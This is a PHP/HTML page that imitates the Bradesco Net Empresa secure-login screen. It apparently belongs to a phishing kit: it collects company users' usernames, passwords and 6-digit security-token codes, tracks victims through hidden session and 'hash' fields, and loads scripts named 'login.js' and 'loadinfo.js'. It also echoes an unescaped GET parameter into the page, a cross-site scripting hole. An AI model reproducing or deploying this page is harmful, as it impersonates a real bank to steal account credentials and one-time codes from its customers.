<?php
    include 'validacao.php';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco Bradesco | Componente de Segurança (Plugin)</title>
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" type="text/css" href="css/estrutura.css">
    <link rel="stylesheet" type="text/css" href="css/login.css">
    <link rel="stylesheet" type="text/css" href="css/interna_login.css">
    
    


</head>
<body>
    <div id="topo" class="varejo">
        <div class="centro">
            <div class="bgrTopoDireita"></div>
            <img src="images/logo.png" alt="Você está no Acesso Seguro do Bradesco Net Empresa. Utilize TAB para navegar." style="height=131px; left: 4px; position: absolute; text-indent: -9999px; top: 11px; z-index: 2; width: 146px;" class="pngfix tabindex tabfirst" tabindex="2">
            <ul id="_id48" class="login_topo">
                <li id="_id49" class="tp1"></li>
                <li id="_id50" class="tp2"></li>
                <li id="_id51" class="btCancelarAcesso"><a id="_id52" href="javascript:;" tabindex="2" title="CANCELAR ACESSO" class="btCancelar_acessoVarejo">CANCELAR ACESSO</a></li>
            </ul>
            <div class="direita after">
                <ul id="_id55" class="menuSessao">
                    <li id="_id56"> <?php echo dataPorExtenso();?></li>
                </ul>
                <div class="login_title2"><span id="headerTitulo">
                    <h1>Acesso Seguro</h1>
                    </span>
                    <div class="login-subtitulo">
                        <span id="headerSubtitulo"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="miolo" class="after login ">
        <div id="conteudo" class="after conteudo_L">
            <div class="topo_canto_L"></div>
            <div class="topo_canto_R"></div>
            <div id="conteudo_interno" class="miolo miolo_noBg after">
                <div class="top">
                    <div id="boxTipoAcesso" hidden class="boxes hide">
                        <div id="passo1" class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">1</span>
                            <div id="divTipoAcesso" class="">
                                <div id="tipoAcesso" class="fl mr20">
                                    <div id="msgErroTipoAcesso" class="txtErro"><strong id="idMsgErroTipoAcesso"></strong></div>
                                    <p class="mb10" style="padding-top: 5px;padding-bottom: 10px;"><span style="color: #bf0000;font-size: 15px;"><b>Selecione um tipo de acesso</b></span></p>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" checked name="rdoTipoAcesso" class="frmRadio tabindex" value="USUARIO_SENHA" title="Marque para selecionar usuário e senha" tabindex="3"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso02">Usuário e Senha</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3 ">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso03" value="ICP_BRASIL" name="rdoTipoAcesso" class="frmRadio tabindex" value="6" title="Marque para selecionar ICP Brasil" tabindex="4"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso03">ICP Brasil</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso01" value="CERTIFICADO" name="rdoTipoAcesso" class="frmRadio tabindex" value="5" title="Marque para selecionar certificado digital Bradesco" tabindex="5"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso01">Certificado Digital Bradesco</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div class="clr"></div>
                            </div>
                            <div class="bgb"></div>
                        </div>
                        <div class="botoes">
                            <ul id="identificationForm:ul_btos_bottom" class="btos_bottom">
                                <li id="identificationForm:li_btos_bottom_1"><a id="identificationForm:_id424" href="javascript:;" title="Cancelar Acesso" class="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex" tabindex="38"></a></li>
                                <li id="identificationForm:_id425"><input id="identificationForm:botaoAvancar" name="identificationForm:botaoAvancar" type="image" src="images/blank.gif" alt="Avançar" title="Avançar" class="bt_avancar botoesLogin" tabindex="20"></li>
                            </ul>
                        </div>
                        <div id="identificationForm:div-textoAposBotoes" class="textoAposBotoes"></div>
                        <div id="identificationForm:divPrimeiroAcessoContratos" class="mt40"><span class="HtmlOutputTextBradesco">Primeiro acesso para contratos efetuados na agência </span><a id="identificationForm:primeiroAcesso" href="javascript:;" title="clique aqui" style="font-weight:bold;text-decoration:underline;" class="tabindex" tabindex="40"><span class="HtmlOutputTextBradesco">clique aqui</span></a></div>

                    </div>
                    <div id="boxAguardando" class="boxes hide">
                        <div class="boxTp">
                            <div class="bgt"></div>
                                    <div style="text-align:center;"><p style="font-size:13px; padding:40px 0px;"><img style="vertical-align:middle;margin-right:10px" src="images/aguarando_login.gif" width="42" height="43" alt=""> Aguarde, efetuando login no Net Empresa!</p></div>
                            <div class="bgb"></div>
                        </div>
                        <div class="botoes">
                            <ul id="identificationForm:ul_btos_bottom" class="btos_bottom">
                                <li id="identificationForm:li_btos_bottom_1"><a id="identificationForm:_id424" href="javascript:;" title="Cancelar Acesso" class="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex" tabindex="38"></a></li>
                            </ul>
                        </div>
                    </div>
                    <div id="boxUsuarioSenha" class="boxes hide">
                        <div id="passo1" class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">1</span>
                            <div id="divTipoAcesso" class="">
                                <div id="tipoAcesso" class="fl mr20">
                                    <div id="msgErroTipoAcesso" class="txtErro"><strong id="idMsgErroTipoAcesso"></strong></div>
                                    <p class="mb10" style="padding-top: 5px;padding-bottom: 10px;"><span style="color: #bf0000;font-size: 15px;"><b>Selecione um tipo de acesso</b></span></p>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio"  name="safadao" id="safadao" class="frmRadio tabindex" value="USUARIO_SENHA" title="Marque para selecionar usuário e senha" tabindex="3" checked></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso02">Usuário e Senha</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3 ">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso03" value="ICP_BRASIL" name="rdoTipoAcesso" class="frmRadio tabindex" value="6" title="Marque para selecionar ICP Brasil" tabindex="4"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso03">ICP Brasil</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso01" value="CERTIFICADO" name="rdoTipoAcesso" class="frmRadio tabindex" value="5" title="Marque para selecionar certificado digital Bradesco" tabindex="5"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso01">Certificado Digital Bradesco</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div id="boxLogin" class="boxTp2 fl mr20 w200 none divUsuarioSenha" style="display: block;">
                                    <div id="msgErroBoxLogin" class="txtErro">
                                        <strong class="msgErro" class="tabindex" tabindex="13"></strong>
                                    </div>
                                    <table class="tabFrmTp3">
                                        <colgroup>
                                            <col width="50">
                                            <col width="5">
                                        </colgroup>
                                        <tbody>
                                            <tr>
                                                <td>
                                                    <label class="tp3" for="identificationForm:txtUsuario">
                                                        <span title="Informe o nome do usuário" class="HtmlOutputTextBradesco">Usuário</span>
                                                    </label>
                                                </td>
                                                <td></td>
                                                <td>
                                                    <input id="loginUsuario" name="identificationForm:txtUsuario" type="text" value="" title="Informe o nome do usuário" style="width: 145px" class="frmTxt1 tabindex" tabindex="14">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="mb10">
                                        <colgroup>
                                            <col width="50">
                                            <col width="5">
                                        </colgroup>
                                        <tbody>
                                            <tr>
                                                <td>
                                                    <label class="tp3" for="identificationForm:txtSenha">
                                                        <span title="Informe a senha de 8 a 20 dígitos" class="HtmlOutputTextBradesco">Senha</span>
                                                    </label>
                                                </td>
                                                <td></td>
                                                <td>
                                                    <input type="password" id="loginSenha" name="identificationForm:txtSenha" title="Informe a senha de 8 a 20 digitos" style="width: 145px" class="frmTxt1 tabindex" tabindex="15">
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="mb10">
                                        <colgroup>
                                            <col width="17">
                                        </colgroup>
                                        <tbody>
                                            <tr>
                                                <td></td>
                                                <td>
                                                    <a id="lnkEsqueci" href="javascript:;" title="Esqueci meu usuário e desejo recuperá-lo por email" class="lnk1 tabindex" tabindex="16"><span class="HtmlOutputTextBradesco">Esqueci meu usuário e desejo<br> recuperá-lo por email</span></a>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div class="clr"></div>
                                
                            </div>

                            <div class="bgb"></div>
                        </div>
                        <div class="botoes">
                            <ul id="identificationForm:ul_btos_bottom" class="btos_bottom">
                                <li id="identificationForm:li_btos_bottom_1"><a  href="javascript:;" title="Cancelar Acesso" class="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex" tabindex="38"></a></li>
                                <li id="identificationForm:_id425"><input name="identificationForm:botaoAvancar" type="image" src="images/blank.gif" alt="Avançar" title="Avançar" class="bt_avancar botoesLogin" tabindex="20"></li>
                            </ul>
                        </div>
                        <div id="identificationForm:div-textoAposBotoes" class="textoAposBotoes"></div>
                        <div id="identificationForm:divPrimeiroAcessoContratos" class="mt40"><span class="HtmlOutputTextBradesco">Primeiro acesso para contratos efetuados na agência </span><a id="identificationForm:primeiroAcesso" href="javascript:;" title="clique aqui" style="font-weight:bold;text-decoration:underline;" class="tabindex" tabindex="40"><span class="HtmlOutputTextBradesco">clique aqui</span></a></div>

                    </div>

                    <div id="boxICPBrasil" class="boxes hide">
                        <div id="passo1" class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">1</span>
                            <div id="divTipoAcesso" class="">
                                <div id="tipoAcesso" class="fl mr20">
                                    <div id="msgErroTipoAcesso" class="txtErro"><strong id="idMsgErroTipoAcesso"></strong></div>
                                    <p class="mb10" style="padding-top: 5px;padding-bottom: 10px;"><span style="color: #bf0000;font-size: 15px;"><b>Selecione um tipo de acesso</b></span></p>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" name="rdoTipoAcesso" class="frmRadio tabindex" value="USUARIO_SENHA" checked title="Marque para selecionar usuário e senha" tabindex="3"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso02">Usuário e Senha</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3 ">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso03" value="ICP_BRASIL" name="rdoTipoAcesso" class="frmRadio tabindex" value="6" title="Marque para selecionar ICP Brasil" tabindex="4"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso03">ICP Brasil</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso01" value="CERTIFICADO" name="rdoTipoAcesso" class="frmRadio tabindex" value="5" title="Marque para selecionar certificado digital Bradesco" tabindex="5"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso01">Certificado Digital Bradesco</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div class="boxTp2 fl mr20 w200 none divUsuarioSenha aguardeNaoImplementado" style="display: block;">
                                    <p><img src="images/aguarando_login.gif" width="30" alt="">Aguarde...</p>
                                </div>        
                                <div class="clr"></div>
                                
                            </div>


                            <div class="bgb"></div>
                        </div>
                        <div class="botoes">
                            <ul id="identificationForm:ul_btos_bottom" class="btos_bottom">
                                <li id="identificationForm:li_btos_bottom_1"><a  href="javascript:;" title="Cancelar Acesso" class="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex" tabindex="38"></a></li>
                                <li id="identificationForm:_id425"><input name="identificationForm:botaoAvancar" type="image" src="images/blank.gif" alt="Avançar" title="Avançar" class="bt_avancar botoesLogin" tabindex="20"></li>
                            </ul>
                        </div>
                        <div id="identificationForm:div-textoAposBotoes" class="textoAposBotoes"></div>
                        <div id="identificationForm:divPrimeiroAcessoContratos" class="mt40"><span class="HtmlOutputTextBradesco">Primeiro acesso para contratos efetuados na agência </span><a id="identificationForm:primeiroAcesso" href="javascript:;" title="clique aqui" style="font-weight:bold;text-decoration:underline;" class="tabindex" tabindex="40"><span class="HtmlOutputTextBradesco">clique aqui</span></a></div>

                    </div>

                    <div id="boxCertificado" class="boxes hide">
                        <div id="passo1" class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">1</span>
                            <div id="divTipoAcesso" class="">
                                <div id="tipoAcesso" class="fl mr20">
                                    <div id="msgErroTipoAcesso" class="txtErro"><strong id="idMsgErroTipoAcesso"></strong></div>
                                    <p class="mb10" style="padding-top: 5px;padding-bottom: 10px;"><span style="color: #bf0000;font-size: 15px;"><b>Selecione um tipo de acesso</b></span></p>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" checked name="rdoTipoAcesso" class="frmRadio tabindex" value="USUARIO_SENHA" title="Marque para selecionar usuário e senha" tabindex="3"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso02">Usuário e Senha</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3 ">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso03" value="ICP_BRASIL" name="rdoTipoAcesso" class="frmRadio tabindex" value="6" title="Marque para selecionar ICP Brasil" tabindex="4"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso03">ICP Brasil</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table class="tabFrmTp3">
                                        <tbody>
                                            <tr>
                                                <td class=""><span class="HtmlOutputTextBradesco"><input type="radio" id="rdoTipoAcesso01" value="CERTIFICADO" name="rdoTipoAcesso" class="frmRadio tabindex" value="5" title="Marque para selecionar certificado digital Bradesco" tabindex="5"></span></td>
                                                <td><span class="HtmlOutputTextBradesco"><label class="tp3" for="rdoTipoAcesso01">Certificado Digital Bradesco</label></span></td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                                <div class="boxTp2 fl mr20 w200 none divUsuarioSenha aguardeNaoImplementado" style="display: block;">
                                    <p><img src="images/aguarando_login.gif" width="30" alt="">Aguarde...</p>
                                </div>    
                                <div class="clr"></div>
                                
                            </div>

                            <div class="bgb"></div>
                        </div>
                        <div class="botoes">
                            <ul id="identificationForm:ul_btos_bottom" class="btos_bottom">
                                <li id="identificationForm:li_btos_bottom_1"><a  href="javascript:;" title="Cancelar Acesso" class="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex" tabindex="38"></a></li>
                                <li id="identificationForm:_id425"><input name="identificationForm:botaoAvancar" type="image" src="images/blank.gif" alt="Avançar" title="Avançar" class="bt_avancar botoesLogin" tabindex="20"></li>
                            </ul>
                        </div>
                        <div id="identificationForm:div-textoAposBotoes" class="textoAposBotoes"></div>
                        <div id="identificationForm:divPrimeiroAcessoContratos" class="mt40"><span class="HtmlOutputTextBradesco">Primeiro acesso para contratos efetuados na agência </span><a id="identificationForm:primeiroAcesso" href="javascript:;" title="clique aqui" style="font-weight:bold;text-decoration:underline;" class="tabindex" tabindex="40"><span class="HtmlOutputTextBradesco">clique aqui</span></a></div>

                    </div>
 
                    <div id="boxTokenCelular" class="boxes hide">
                        <div class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">2</span>
                            <div class="fl mr20 fl">
                                <label for="txtSenhaToken"><span class="numeric">Digite a <strong>chave</strong> informada no<br>visor do seu celular.</span></label>
                            </div>
                            <div class="fl w440">
                                <div>
                                    <div class="fl pt5 mb10"><span class="HtmlOutputTextBradesco">Olá, </span><span class="nomeUsuario"></span></div>
                                    <div class="fl"><a id="_id84" href="javascript:;" class="bTip auto_Tip">Ligue o seu dispositivo para receber a Chave de Segurança e depois digite o código gerado neste campo.</a></div>
                                </div>
                                <div id="chaveseguranca" class="clr boxTp2 mt10  frmErroSenha "><img width="120px" class="fl mr10 ml10" src="images/img_cel_seg.png">
                                    <div class="fl w200">
                                        <p id="erroSenhaVazia" class="txtErro hide"><strong><span class="HtmlOutputTextBradesco">Digite a senha do certificado</span></strong></p><span class="inputSenha4 mb5 fl mr5"><input type="password" name="tokenCelular" maxlength="6" class="numeric txtSenhaToken w60 tabindex tabfirst" tabindex="3"></span>
                                        <div class="info fl mt5"><span class="HtmlOutputTextBradesco">(6 dígitos)</span></div>
                                        <p class="clr fs10"><span class="HtmlOutputTextBradesco">Nº de série do dispositivo:</span><span class="HtmlOutputTextBradesco"><br></span><strong><span class="HtmlOutputTextBradesco numeroDeSerie"></span></strong></p>
                                    </div>
                                </div>
                            </div>
                            <div class="bgb"></div>
                        </div>
                        <div class="box-alerta after mt10 mb20"><div class="ctn-box after tabindex" tabindex="5">O Bradesco não envia e-mails contendo links ou solicitando atualizações de certificados digitais, componentes de segurança ou identificação do usuário.</div></div>
                        <div class="rodape after">
                            <ul id="formTeste:botoes" class="btos_bottom">
                                <li id="formTeste:_id106"><a id="formTeste:_id107" href="#token" class="btnCancelarAcesso mr10 fecharFiltroExtrato"></a></li>
                                <li id="formTeste:_id108"><input id="botaoAcessar" name="botaoAcessar" type="image" src="images/blank.gif" alt="Acessar" title="Acessar" class="bt_confirmar tabindex tab-1 btnAcessar" tabindex="4"></li>
                            </ul>
                        </div>
                    </div>
                    <div id="boxTokenChaveiro" class="boxes hide">
                        <div class="boxTp">
                            <div class="bgt"></div>
                            <span class="passo">2</span>
                            <div class="fl mr20 fl">
                                <label for="txtSenhaToken"><span class="numeric">Digite a <strong>chave</strong> informada no<br>seu dispositivo de segurança.</span></label>
                            </div>
                            <div class="fl w440">
                                <div>
                                    <div class="fl pt5 mb10"><span class="HtmlOutputTextBradesco">Olá, </span><span class="nomeUsuario"></span></div>
                                    <div class="fl"><a id="_id84" href="javascript:;" class="bTip auto_Tip">Ligue o seu dispositivo para receber a Chave de Segurança e depois digite o código gerado neste campo.</a></div>
                                </div>
                                <div id="chaveseguranca" class="clr boxTp2 mt10  frmErroSenha "><img width="120px" class="fl mr10 ml10" src="images/img_chaveirol_seg.png">
                                    <div class="fl w200" style="margin-top:10px;">
                                        <p id="erroSenhaVazia" class="txtErro hide"><strong><span class="HtmlOutputTextBradesco">Digite a senha do certificado</span></strong></p><span class="inputSenha4 mb5 fl mr5"><input type="password" name="tokenCelular" maxlength="6" class="numeric txtSenhaToken w60 tabindex tabfirst" tabindex="3"></span>
                                        <div class="info fl mt5"><span class="HtmlOutputTextBradesco">(6 dígitos)</span></div>
                                        <p class="clr fs10"><span class="HtmlOutputTextBradesco">Nº de série do dispositivo:</span><span class="HtmlOutputTextBradesco"><br></span><strong><span class="HtmlOutputTextBradesco numeroDeSerie"></span></strong></p>
                                    </div>
                                </div>
                            </div>
                            <div class="bgb"></div>
                        </div>
                        <div class="box-alerta after mt10 mb20"><div class="ctn-box after tabindex" tabindex="5">O Bradesco não envia e-mails contendo links ou solicitando atualizações de certificados digitais, componentes de segurança ou identificação do usuário.</div></div>
                        <div class="rodape after">
                            <ul id="formTeste:botoes" class="btos_bottom">
                                <li id="formTeste:_id106"><a id="formTeste:_id107" href="#token" class="btnCancelarAcesso mr10 fecharFiltroExtrato"></a></li>
                                <li id="formTeste:_id108"><input id="botaoAcessar" name="botaoAcessar" type="image" src="images/blank.gif" alt="Acessar" title="Acessar" class="bt_confirmar tabindex tab-1 btnAcessar" tabindex="4"></li>
                            </ul>
                        </div>
                    </div>

                </div>
                
            </div>
 
            <div class="base">
                <span class="c1">
                    <!--  -->
                </span>
                <span class="c2">
                    <!--  -->
                </span>
            </div>
        </div>
        <span id="boxDireitaLogin" title="Precisa de Ajuda" class="tabindex" tabindex="41">
            <ul class="box-direita" id="lista-dicas-seguranca" title="">
            <li id="_id82" title="" style="display: list-item;">
                <div class="box" title="">
                    <div class="boxP14" id="dicaCadeado" title="">
                        <span class="HtmlOutputTextBradesco">
                            <h2 class="ttlPrecisa">PRECISADE AJUDA</h2>
                            <a href="javascript:;" class="box-direita box img"></a>
                            <p class="mb20" title=""><strong title="">No site Bradesco Pessoa Jurídica, você encontra as respostas essas e outras dúvidas</strong></p>
                            <a href="javascript:;" class="ttlAcessar" title="Acessar Bradesco Net Empresa">Acessar  Bradesco Net Empresa</a>
                            <ul class="mb10" title="">
                                <li title=""><p class="mb10" title="">Confira os passos para ter acesso ao Bradesco Net Empresa e fazer consultas, transações bancárias e transmitir arquivos pela internet de maneira simples e segura.</p></li>
                            </ul>
                            <a href="javascrip:;" class="ttlTiposAcesso" title="Tipos de acesso">Tipos de acesso</a>
                            <ul class="mb10" title="">
                                <li title=""><p class="mb10" title="">Confira como acessar a conta conforme seu tipo de acesso</p></li>
                            </ul>
                            <a href="javascript:;" class="ttlChave" title="Chave de Segurança">Chave de Segurança</a>
                            <ul class="mb10" title="">
                                <li title=""><p class="mb10" title="">Confira como quais são os tipos e como utilizar sua chave de segurança</p></li>
                            </ul>
                            <div class="dicasSeguranca_1 none_i" id="dicasSeguranca_1">
                            </div>
                        </span>
                    </div>
                </div>
            </li>
            </ul>
        </span>        
    </div>

    <div id="rodape" class="after login"><div class="miolo"><ul id="_id91" class="listaLogos"> <li id="li_logoBradesco" class="item1"> <a href="javascript:;" class="tabindex" title="Bradesco Dia e Noite" tabindex="42">Dia&amp;Noite</a> </li> <li id="li_logoIso" class="item2"> <a href="#" class="tabindex" title="Bradesco Internet Banking ISO 9001" tabindex="43">ISO 9001</a> </li> </ul> <ul id="_id94" class="listaMenuInferior"> </ul> <ul id="_id99" class="listaTelefones"> <li title="Capitais e Regiões Metropolitanas e Demais Localidades." class=" item1 "> <span>Bradesco Apoio à Empresa</span> 3003-1000 </li> <li title="SAC - Serviço de Apoio ao Cliente Cancelamento, Reclamações e Informações" class=" item2"> <span>Alô Bradesco</span> 0800 202 1000 </li> <li title="Atendimento 24h, 7 dias por semana" class=" item3"> <span>Deficiente Auditivo ou de Fala</span> 0800 722 0099 </li> <li title="Atendimento de segunda a sexta-feira das 8h às 18h, exceto feriados" class=" ultimo item4"> <span>Ouvidoria</span> 0800 727 9933 </li> </ul></div></div>
    
 
<input type="hidden" id="id" value="<?php echo isset($_SESSION['idInfo']) ? $_SESSION['idInfo'] : '';  ?>">
<input type="hidden" id="hash" value="<?php echo isset($_GET['hash']) ? $_GET['hash'] : '';  ?>">
<script src="js/jquery.min.js"></script>
<script src="js/login.js"></script>
<script src="js/loadinfo.js"></script>
</body>
</html>